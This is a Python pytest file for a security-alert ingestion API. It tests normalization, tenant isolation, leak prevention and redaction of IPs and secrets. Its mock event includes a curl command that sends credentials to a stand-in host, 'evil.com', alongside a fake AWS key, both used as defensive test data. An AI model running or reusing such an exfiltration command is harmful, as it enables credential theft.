import pytest
import pytest_asyncio
from httpx import AsyncClient, ASGITransport
import uuid
from sqlalchemy.ext.asyncio import create_async_engine, async_sessionmaker, AsyncSession
from src.main import app
from src.db.database import get_db
from src.db.models import Base, RawEventModel, NormalizedAlertModel, ProcessingStatus
from sqlalchemy import select
from unittest.mock import patch

# In-memory SQLite for testing
TEST_DATABASE_URL = "sqlite+aiosqlite:///:memory:"

engine = create_async_engine(TEST_DATABASE_URL, echo=False)
TestingSessionLocal = async_sessionmaker(engine, expire_on_commit=False, class_=AsyncSession)

async def override_get_db():
    async with TestingSessionLocal() as session:
        yield session

@pytest_asyncio.fixture(autouse=True)
async def prepare_database():
    app.dependency_overrides[get_db] = override_get_db
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    yield
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.drop_all)
    app.dependency_overrides.clear()

@pytest_asyncio.fixture
async def async_client():
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        yield client

MOCK_PAYLOAD = {
    "tenant_id": "TENANT-A",
    "source_type": "XDR",
    "source_vendor": "CrowdStrike",
    "source_product": "Falcon",
    "payload": {
        "detected_at": "2023-10-01T12:00:00Z",
        "event_id": "v123",
        "username": "alice@bank.com",
        "src_ip": "10.0.4.15",
        "cmdline": "curl -u admin:supersecret123 http://evil.com"
    }
}

@pytest.mark.asyncio
async def test_health(async_client):
    response = await async_client.get("/health")
    assert response.status_code == 200
    assert response.json() == {"status": "healthy"}

@pytest.mark.asyncio
async def test_successful_ingestion(async_client):
    response = await async_client.post("/api/v1/events", json=MOCK_PAYLOAD)
    assert response.status_code == 201
    data = response.json()
    assert data["status"] == "NORMALIZED"
    
    async with TestingSessionLocal() as db:
        res = await db.execute(select(NormalizedAlertModel).where(NormalizedAlertModel.id == uuid.UUID(data["normalized_alert_id"])))
        norm = res.scalar_one_or_none()
        assert norm is not None
        assert norm.tenant_id == "TENANT-A"

@pytest.mark.asyncio
async def test_normalization_failure_raw_retention(async_client):
    bad_payload = dict(MOCK_PAYLOAD)
    bad_payload["payload"] = {"event_id": "v123", "username": "alice@bank.com", "secret_key": "AKIA1234567890123456"} 
    
    response = await async_client.post("/api/v1/events", json=bad_payload)
    assert response.status_code == 422
    data = response.json()
    assert data["status"] == "NORMALIZATION_FAILED"
    
    async with TestingSessionLocal() as db:
        res = await db.execute(select(RawEventModel).where(RawEventModel.id == uuid.UUID(data["raw_event_id"])))
        raw = res.scalar_one_or_none()
        assert raw is not None
        assert raw.processing_status.value == "NORMALIZATION_FAILED"
        assert "timestamp" in raw.normalization_error.lower()
        # Verify secrets are NOT in the error string
        assert "AKIA1234567890123456" not in raw.normalization_error
        assert "error_code" not in raw.normalization_error # Pydantic extraction

@pytest.mark.asyncio
async def test_normalized_persistence_failure_raw_retention(async_client):
    # Mock the SQLAlchemy flush/commit to raise SQLAlchemyError when saving norm_model
    # Specifically, intercept add() for NormalizedAlertModel to trigger error during commit
    from sqlalchemy.exc import SQLAlchemyError
    original_add = AsyncSession.add
    
    def mocked_add(self, instance, *args, **kwargs):
        if isinstance(instance, NormalizedAlertModel):
            original_commit = self.commit
            def bad_commit(*a, **kw):
                self.commit = original_commit # restore for next calls
                raise SQLAlchemyError("Mocked constraint violation")
            self.commit = bad_commit
        return original_add(self, instance, *args, **kwargs)

    with patch('sqlalchemy.ext.asyncio.AsyncSession.add', new=mocked_add):
        response = await async_client.post("/api/v1/events", json=MOCK_PAYLOAD)
        assert response.status_code == 422
        data = response.json()
        assert data["status"] == "PERSISTENCE_FAILED"

    # Verify raw exists and normalized does not
    async with TestingSessionLocal() as db:
        res = await db.execute(select(RawEventModel).where(RawEventModel.id == uuid.UUID(data["raw_event_id"])))
        raw = res.scalar_one_or_none()
        assert raw is not None
        assert raw.processing_status.value == "PERSISTENCE_FAILED"
        assert "error_code=PERSISTENCE_FAILURE" in raw.normalization_error

        res2 = await db.execute(select(NormalizedAlertModel).where(NormalizedAlertModel.raw_event_id == uuid.UUID(data["raw_event_id"])))
        norm = res2.scalar_one_or_none()
        assert norm is None


@pytest.mark.asyncio
async def test_tenant_isolation_proof(async_client):
    resp_a = await async_client.post("/api/v1/events", json=MOCK_PAYLOAD)
    alert_id = resp_a.json()["normalized_alert_id"]
    
    resp_b = await async_client.get(f"/api/v1/alerts/{alert_id}?tenant_id=TENANT-B")
    assert resp_b.status_code == 404
    
    resp_a2 = await async_client.get(f"/api/v1/alerts/{alert_id}?tenant_id=TENANT-A")
    assert resp_a2.status_code == 200

@pytest.mark.asyncio
async def test_api_raw_data_leakage_proof(async_client):
    resp = await async_client.post("/api/v1/events", json=MOCK_PAYLOAD)
    alert_id = resp.json()["normalized_alert_id"]
    
    resp_get = await async_client.get(f"/api/v1/alerts/{alert_id}?tenant_id=TENANT-A")
    assert resp_get.status_code == 200
    data = resp_get.json()
    assert "raw_event" not in data
    assert "raw_payload" not in data

@pytest.mark.asyncio
async def test_privacy_endpoint_private_ip_regression(async_client):
    payload = dict(MOCK_PAYLOAD)
    payload["payload"]["src_ip"] = "10.0.4.15"
    resp = await async_client.post("/api/v1/events", json=payload)
    alert_id = resp.json()["normalized_alert_id"]
    
    safe_resp = await async_client.post("/api/v1/privacy/safe-evidence", json={
        "tenant_id": "TENANT-A",
        "alert_ids": [alert_id]
    })
    
    assert safe_resp.status_code == 200
    safe_data = safe_resp.json()
    evidence = safe_data["evidence_items"][0]
    
    assert "PRIVATE_IP_" in evidence["src_ip"]
    assert evidence["src_ip"] != "10.0.4.15"
    assert "10.0.4.15" not in str(safe_data)
    assert "supersecret123" not in str(safe_data)

@pytest.mark.asyncio
async def test_package_alias_namespace_regression(async_client):
    resp = await async_client.post("/api/v1/events", json=MOCK_PAYLOAD)
    alert_id = resp.json()["normalized_alert_id"]
    
    safe_resp1 = await async_client.post("/api/v1/privacy/safe-evidence", json={
        "tenant_id": "TENANT-A",
        "alert_ids": [alert_id]
    })
    alias1 = safe_resp1.json()["evidence_items"][0]["user"]
    
    safe_resp2 = await async_client.post("/api/v1/privacy/safe-evidence", json={
        "tenant_id": "TENANT-A",
        "alert_ids": [alert_id]
    })
    alias2 = safe_resp2.json()["evidence_items"][0]["user"]
    
    assert alias1 != alias2
    assert "USER_" in alias1 and "USER_" in alias2

@pytest.mark.asyncio
async def test_missing_tenant(async_client):
    payload = dict(MOCK_PAYLOAD)
    del payload["tenant_id"]
    resp = await async_client.post("/api/v1/events", json=payload)
    assert resp.status_code == 422 # FastAPI built-in validation fails

@pytest.mark.asyncio
async def test_unknown_source(async_client):
    payload = dict(MOCK_PAYLOAD)
    payload["source_type"] = "MAGIC"
    resp = await async_client.post("/api/v1/events", json=payload)
    assert resp.status_code == 422
    assert resp.json()["status"] == "NORMALIZATION_FAILED"
